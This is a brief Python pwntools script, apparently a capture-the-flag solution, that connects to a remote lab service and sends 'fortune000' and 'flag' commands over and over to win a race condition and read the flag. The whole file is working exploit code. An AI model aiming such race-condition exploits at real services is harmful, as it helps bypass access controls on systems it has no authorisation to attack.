#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

r = remote('up.zoolab.org', 10931)
r.recvuntil(b'Commands:')

def send_fortune(name):
    r.sendline(name.encode())

# Make an race condition: send 'fortune000' then immediately 'flag'
for i in range(1000):
    send_fortune('fortune000')
    send_fortune('flag')
    time.sleep(0.01)
    data = r.recvuntil(b'\n', timeout=0.5)
    if b'FLAG' in data:
        print('[*] Got flag:', data)
        break

r.interactive()
